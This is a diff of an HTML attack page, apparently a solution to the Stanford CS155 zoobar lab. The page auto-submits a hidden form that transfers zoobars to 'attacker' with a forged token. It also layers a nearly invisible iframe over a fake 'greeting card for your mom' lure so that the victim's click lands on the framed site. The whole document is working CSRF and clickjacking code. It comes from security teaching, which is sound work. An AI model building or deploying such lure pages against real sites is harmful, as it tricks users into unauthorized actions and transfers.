@@ -4,36 +4,49 @@
         <meta charset='utf-8'>
         <style type="text/css">
             #zbframe{
-                width: 900px;
-                height: 700px;
+                width: 920px;
+                height: 400px;
+                overflow: hidden;
+                border: 0;
+                position:absolute;
+                left:10px;
+                top:10px;
+                opacity: 0.01;
+                z-index: 1;
+            }
+            #fake{
+                z-index: 0;
+            }
+            #fake span{
+                white-space:nowrap;
+                font-size: 25px;
+                position:absolute;
+                left:50px;
+                top:200px;
+            }
+            #fake input{
+                position:absolute;
+                left:313px;
+                top:242px;
             }
         </style>
         <script>
-            var hit=false;
-            var runs=0;
-            function jacked(){
-                if(runs==1){
-                    document.getElementById('tf').submit();
-                    hit=true;
-                    }else{
-                    runs=runs+1;
-                }
-            }
-            function bye(){
-                if(hit){
-                    window.location.replace("http://crypto.stanford.edu/cs155");
-                }
+            function prepare(){
+                document.getElementById('tf').submit();
             }
         </script>
     </head>
-    <body> 
-        <form id="tf" method="POST" name="transferform" target="cs155" action="http://zoobar.stanford.edu/transferB.php">
-            <input name="zoobars" type="hidden" value="1" size="5">
+    <body onload="prepare()"> 
+        <form id="tf" method="POST" name="transferform" target="zbframeReal" action="http://zoobar.stanford.edu/transferC.php">
+            <input name="zoobars" type="hidden" value="10" size="5">
             <input name="recipient" type="hidden" value="attacker">
-            <input name="token" type="hidden" value="">
+            <input name="token" type="hidden" value="a">
             <input name="submission" type="hidden" value="Send">
         </form>
-        <iframe name="cs155" onload="jacked()"></iframe>
-        <iframe id="zbframe" src="buster.html"></iframe>
+        <div id="fake" class="layer">
+            <span>Send a greeting card to your mom on Mother's Day!</span>
+            <input type="button" value="Send"/>
+        </div>
+        <iframe id="zbframe" class="layer" src="buster.html"></iframe>
     </body>
 </html>
